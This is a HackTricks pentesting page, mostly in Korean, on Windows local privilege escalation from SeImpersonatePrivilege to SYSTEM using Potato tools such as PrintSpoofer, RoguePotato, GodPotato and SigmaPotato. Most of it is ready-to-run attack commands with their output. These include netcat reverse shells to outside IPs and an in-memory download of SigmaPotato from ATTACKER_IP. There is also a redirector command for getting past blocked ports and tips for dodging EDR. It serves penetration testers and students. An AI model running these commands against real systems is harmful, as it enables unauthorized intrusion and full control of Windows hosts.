# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato는** Windows Server 2019 및 Windows 10 빌드 1809 이후 버전에서는 작동하지 않습니다. 그러나 [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)**을(를) 사용하여 **동일한 권한을 활용하고 `NT AUTHORITY\SYSTEM` 수준의 접근을 획득할 수 있습니다**. 이 [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)은 `PrintSpoofer` 도구에 대해 심도 있게 다루며, JuicyPotato가 더 이상 작동하지 않는 Windows 10 및 Server 2019 호스트에서 impersonation 권한을 악용하는 데 사용할 수 있습니다.

> [!TIP]
> 2024–2025년에 자주 유지되는 현대적인 대안으로는 SigmaPotato (GodPotato의 포크)가 있으며, in-memory/.NET reflection 사용과 확장된 OS 지원을 추가합니다. 아래의 빠른 사용법과 References의 레포를 참조하세요.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 요구사항 및 일반적인 함정

다음의 모든 기술은 다음 권한 중 하나를 보유한 컨텍스트에서 impersonation이 가능한 특권 서비스(임포스네이션 가능 특권 서비스를) 악용하는 데 의존합니다:

- SeImpersonatePrivilege (가장 흔함) 또는 SeAssignPrimaryTokenPrivilege
- 토큰이 이미 SeImpersonatePrivilege를 가지고 있다면 High integrity는 필요하지 않습니다 (IIS AppPool, MSSQL 등 많은 서비스 계정에서 일반적임)

권한을 빠르게 확인:
```cmd
whoami /priv | findstr /i impersonate
```
- If your shell runs under a restricted token lacking SeImpersonatePrivilege (common for Local Service/Network Service in some contexts), regain the account’s default privileges using FullPowers, then run a Potato. Example: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). In hardened environments where Spooler is disabled post-PrintNightmare, prefer RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requires an OXID resolver reachable on TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Older builds needed the -f flag.
- EfsPotato/SharpEfsPotato abuse MS-EFSR; if one pipe is blocked, try alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Error 0x6d3 during RpcBindingSetAuthInfo typically indicates an unknown/unsupported RPC authentication service; try a different pipe/transport or ensure the target service is running.

## 빠른 데모

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
참고:
- -i 옵션으로 현재 콘솔에서 대화형 프로세스를 생성하거나, -c 옵션으로 한 줄 명령을 실행할 수 있습니다.
- Spooler 서비스가 필요합니다. 비활성화되어 있으면 동작하지 않습니다.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
만약 outbound 135이 차단되어 있다면, redirector에서 socat을 통해 OXID resolver를 pivot하세요:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato는 2022년 말에 공개된 새로운 COM abuse primitive로, Spooler/BITS 대신 **PrintNotify** 서비스를 타깃으로 합니다. 이 binary는 PrintNotify COM server를 인스턴스화하고, 가짜 `IUnknown`를 끼워 넣은 뒤 `CreatePointerMoniker`를 통해 권한 있는 callback을 트리거합니다. PrintNotify 서비스(실행 계정: **SYSTEM**)가 연결을 되돌려보내면, 프로세스는 반환된 token을 duplicate하여 제공된 payload를 전체 권한으로 spawn합니다.

핵심 동작 노트:

* Print Workflow/PrintNotify service가 설치된 Windows 10/11 및 Windows Server 2012–2022에서 동작합니다 (legacy Spooler가 PrintNightmare 이후 비활성화된 경우에도 해당 서비스는 존재합니다).
* 호출 컨텍스트에 **SeImpersonatePrivilege**가 있어야 합니다 (일반적으로 IIS APPPOOL, MSSQL, 및 scheduled-task 서비스 계정에서 보유).
* 직접 명령 또는 interactive mode를 받아 원래 console 안에 머물 수 있습니다. 예:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* 순수하게 COM-based이기 때문에 named-pipe listeners나 외부 redirectors가 필요 없으며, Defender가 RoguePotato의 RPC 바인딩을 차단하는 호스트에서 바로 대체하여 사용할 수 있습니다.

Ink Dragon와 같은 오퍼레이터는 SharePoint에서 ViewState RCE를 획득한 직후 `w3wp.exe` 워커에서 SYSTEM으로 피벗하기 위해 PrintNotifyPotato를 즉시 실행한 다음 ShadowPad를 설치합니다.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
팁: 하나의 pipe가 실패하거나 EDR이 이를 차단하면, 다른 지원되는 pipes를 시도해 보세요:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
참고:
- SeImpersonatePrivilege가 존재할 때 Windows 8/8.1–11 및 Server 2012–2022에서 작동합니다.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato는 기본값이 RPC_C_IMP_LEVEL_IMPERSONATE인 서비스 DCOM 객체를 표적으로 하는 두 가지 변형을 제공합니다. 제공된 바이너리를 빌드하거나 사용한 다음 명령을 실행하세요:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (업데이트된 GodPotato fork)

SigmaPotato는 .NET reflection을 통한 in-memory execution 및 PowerShell reverse shell helper 같은 최신 편의 기능을 추가합니다.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## 참고자료

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – 서비스 계정의 token privileges를 기본값으로 복원](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
